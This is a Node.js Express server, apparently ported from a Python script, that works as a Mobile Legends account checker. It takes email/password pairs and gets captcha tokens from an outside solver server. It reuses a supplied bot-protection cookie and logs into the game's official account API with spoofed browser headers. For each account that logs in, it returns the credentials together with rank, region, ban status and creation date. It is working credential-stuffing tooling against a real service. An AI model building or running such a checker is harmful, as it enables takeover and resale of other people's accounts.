const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const app = express();

app.use(cors());
app.use(express.json());

// =========================
// FUNGSI UTILITY (dari promax.py)
// =========================
function md5(text) {
    return crypto.createHash('md5').update(text).digest('hex');
}

function makeSign(params) {
    const sorted = Object.keys(params).sort().reduce((obj, key) => {
        obj[key] = params[key];
        return obj;
    }, {});
    
    let so = "";
    for (let [key, value] of Object.entries(sorted)) {
        so += `${key}=${value}&`;
    }
    so += "op=login";
    
    return md5(so);
}

const RANK_RANGES = [
    {min: 0, max: 4, rank: "Warrior III"},
    {min: 5, max: 9, rank: "Warrior II"},
    {min: 10, max: 14, rank: "Warrior I"},
    {min: 15, max: 19, rank: "Elite IV"},
    {min: 20, max: 24, rank: "Elite III"},
    {min: 25, max: 29, rank: "Elite II"},
    {min: 30, max: 34, rank: "Elite I"},
    {min: 35, max: 39, rank: "Master IV"},
    {min: 40, max: 44, rank: "Master III"},
    {min: 45, max: 49, rank: "Master II"},
    {min: 50, max: 54, rank: "Master I"},
    {min: 55, max: 59, rank: "Grandmaster IV"},
    {min: 60, max: 64, rank: "Grandmaster III"},
    {min: 65, max: 69, rank: "Grandmaster II"},
    {min: 70, max: 74, rank: "Grandmaster I"},
    {min: 75, max: 79, rank: "Epic IV"},
    {min: 80, max: 84, rank: "Epic III"},
    {min: 85, max: 89, rank: "Epic II"},
    {min: 90, max: 94, rank: "Epic I"},
    {min: 95, max: 99, rank: "Legend IV"},
    {min: 100, max: 104, rank: "Legend III"},
    {min: 105, max: 109, rank: "Legend II"},
    {min: 110, max: 114, rank: "Legend I"},
    {min: 115, max: 136, rank: "Mythic Entry"},
    {min: 137, max: 160, rank: "Mythic"},
    {min: 161, max: 185, rank: "Mythic Honor"},
    {min: 186, max: 235, rank: "Mythical Glory"},
    {min: 236, max: 9999, rank: "Mythical Immortal"}
];

function getRankName(rankLevel) {
    try {
        rankLevel = parseInt(rankLevel);
        for (let rank of RANK_RANGES) {
            if (rankLevel >= rank.min && rankLevel <= rank.max) {
                if (rank.rank === "Mythic") {
                    let star = rankLevel - 136;
                    return `Mythic ${star} Star`;
                } else if (rank.rank === "Mythic Honor") {
                    let star = rankLevel - 160;
                    return `Mythic Honor ${star + 24} Star`;
                } else if (rank.rank === "Mythical Glory") {
                    let star = rankLevel - 185;
                    return `Mythical Glory ${star + 49} Star`;
                } else if (rank.rank === "Mythical Immortal") {
                    let star = rankLevel - 235;
                    return `Mythical Immortal ${star + 99} Star`;
                }
                return rank.rank;
            }
        }
        return "Unranked";
    } catch {
        return "N/A";
    }
}

// =========================
// API ENDPOINTS
// =========================

// Endpoint untuk get captcha dari API
app.get('/api/captcha', async (req, res) => {
    try {
        const response = await axios.get('http://149.104.77.174:1337/token', { timeout: 15000 });
        if (response.data.success && response.data.token) {
            res.json({ success: true, token: response.data.token });
        } else {
            res.json({ success: false, error: 'Failed to get captcha' });
        }
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// Endpoint untuk check akun
app.post('/api/check', async (req, res) => {
    const { email, password, captcha, abck } = req.body;
    
    if (!email || !password || !captcha || !abck) {
        return res.json({ success: false, error: 'Missing required fields' });
    }
    
    try {
        // Setup headers seperti di promax.py
        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?0',
            'origin': 'https://mtacc.mobilelegends.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://mtacc.mobilelegends.com/',
            'accept-language': 'en-US,en;q=0.9',
            'Cookie': `_abck=${abck}`
        };
        
        // Buat sign
        const p = md5(password);
        const params = {
            account: email,
            md5pwd: p,
            game_token: "",
            recaptcha_token: "",
            e_captcha: captcha,
            country: ""
        };
        
        const payload = {
            op: "login",
            sign: makeSign(params),
            params: params,
            lang: "en"
        };
        
        // Login request
        const loginResponse = await axios.post('https://accountmtapi.mobilelegends.com', payload, { 
            headers,
            timeout: 30000
        });
        
        const loginData = loginResponse.data;
        
        if (loginData.code !== 0) {
            return res.json({ 
                success: false, 
                error: loginData.message || 'Login failed',
                code: loginData.code
            });
        }
        
        // Login success, ambil data
        const sessionToken = loginData.data?.session;
        const guid = loginData.data?.guid;
        
        if (!sessionToken || !guid) {
            return res.json({ success: false, error: 'No session token' });
        }
        
        // Get JWT
        const jwtPayload = { id: guid, token: sessionToken, type: "mt_And" };
        const jwtResponse = await axios.post(
            'https://api.mobilelegends.com/tools/deleteaccount/getToken',
            jwtPayload,
            { headers: { 'Authorization': sessionToken, ...headers }, timeout: 20000 }
        );
        
        const jwt = jwtResponse.data?.data?.jwt;
        if (!jwt) {
            return res.json({ success: false, error: 'No JWT' });
        }
        
        // Get ban info
        let banStatus = 'No';
        try {
            const banResponse = await axios.post(
                'https://api.mobilelegends.com/tools/selfservice/punishList',
                { lang: 'en' },
                { 
                    headers: { 
                        'Authorization': `Bearer ${jwt}`,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        ...headers 
                    },
                    timeout: 10000 
                }
            );
            
            if (banResponse.data.code === 0 && banResponse.data.data?.length > 0) {
                const ban = banResponse.data.data[0];
                banStatus = `Yes (Reason: ${ban.reason || 'Unknown'})`;
            }
        } catch (e) {
            console.log('Ban check error:', e.message);
        }
        
        // Get base info
        const infoResponse = await axios.post(
            'https://sg-api.mobilelegends.com/base/getBaseInfo',
            {},
            { 
                headers: { 'Authorization': `Bearer ${jwt}`, ...headers },
                timeout: 15000 
            }
        );
        
        const info = infoResponse.data?.data || {};
        
        // Get creation date
        let createDate = 'N/A';
        try {
            const k = Buffer.from('jarellisgod0');
            const ts = Math.floor(Date.now() / 1000).toString();
            const nonce = crypto.randomBytes(8).toString('hex');
            
            const sig = crypto.createHmac('sha256', k)
                .update(`${info.roleId || ''}:${info.zoneId || ''}:${ts}:${nonce}`)
                .digest();
            
            const raw = Buffer.concat([
                Buffer.from(info.roleId?.toString() || ''),
                Buffer.from('|'),
                Buffer.from(info.zoneId?.toString() || ''),
                Buffer.from('|'),
                Buffer.from(ts),
                Buffer.from('|'),
                Buffer.from(nonce),
                Buffer.from('|'),
                sig
            ]);
            
            const createResponse = await axios.post(
                'https://artixlucien.x10.mx/mlbb/creation',
                { data: raw.toString('hex') },
                { timeout: 15000 }
            );
            
            if (createResponse.data.success) {
                createDate = createResponse.data.estimated_creation_date || 'N/A';
            }
        } catch (e) {
            console.log('Creation date error:', e.message);
        }
        
        // Format result
        const result = {
            success: true,
            email: email,
            password: password,
            name: info.name || 'Unknown',
            level: info.level || 'N/A',
            role_id: info.roleId || 'N/A',
            zone_id: info.zoneId || 'N/A',
            current_rank: getRankName(info.rank_level || 0),
            highest_rank: getRankName(info.history_rank_level || 0),
            region: info.reg_country || 'N/A',
            create_date: createDate,
            ban_status: banStatus,
            raw_data: info
        };
        
        res.json(result);
        
    } catch (error) {
        console.error('Check error:', error.message);
        res.json({ 
            success: false, 
            error: error.message,
            code: error.response?.status || 500
        });
    }
});

// Endpoint untuk health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Untuk Vercel: export app
if (require.main === module) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Server running on port ${PORT}`);
    });
}
module.exports = app;
